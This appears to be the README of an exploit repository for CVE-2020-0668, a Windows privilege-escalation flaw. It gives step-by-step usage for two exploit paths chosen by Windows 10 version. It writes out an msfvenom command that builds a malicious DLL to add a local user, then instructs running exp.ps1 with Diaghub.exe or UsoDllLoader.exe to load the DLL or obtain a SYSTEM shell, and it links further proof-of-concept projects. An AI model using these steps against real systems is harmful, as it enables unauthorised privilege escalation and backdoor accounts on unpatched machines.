# CVE-2020-0668

> Make CVE-2020-0668 exploit work for version < win10 v1903 and version >= win10 v1903

## Diaghub Exploit (< v1903)

powershell exploit works on version < win10 v1903 with Diaghub.

### Usage 

- STEP 1：generate `evil.dll` with msfvenom 
  -  example add a user ： `msfvenom -p windows/x64/exec CMD="net user test test /add" -f dll > evil.dll`
- STEP 2：execute `exp.ps1` with powershell
- STEP 3：execute `Diaghub.exe C:\ProgramData evil.dll` to load dll and add user.

![Diaghub](https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-28-10-Diaghub.png)

- [Diaghub](https://github.com/xct/diaghub)

## UsoDllLoader Exploit (>= v1903)

powershell exploit works on version >= win10 v1903 with UsoDllLoader.

### Usage

- STEP 1 : execute `exp.ps1` with powershell 
- STEP 2 : execute `UsoDllLoader.exe` to get a system shell

![exploit](https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-28-10-UsoDllLoader.png)

- [UsoDllLoader](https://github.com/itm4n/UsoDllLoader)

## Other Exp or PoC

### SysTracingPoc Exp

A x86 release version of [SysTracingPoc](https://github.com/itm4n/SysTracingPoc) for [issue](https://github.com/itm4n/SysTracingPoc/issues/1)，exploit works on version >= win10 v1903 because of UsoLoadDll.

- [SysTracingPoc](https://github.com/itm4n/SysTracingPoc)

### RedCursorSecurityConsulting PoC

A .net PoC. If you take a look at `C:\Windows\System32\evil.dll` and rename it as `evil.txt`.

You will find it not a dll file. Only tracing log in it.

- [CVE-2020-0668](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668)

### Nan3r PoC

A powershell PoC. Also only tracing log in evil.dll.

- [CVE-2020-0668](https://github.com/Nan3r/CVE-2020-0668)

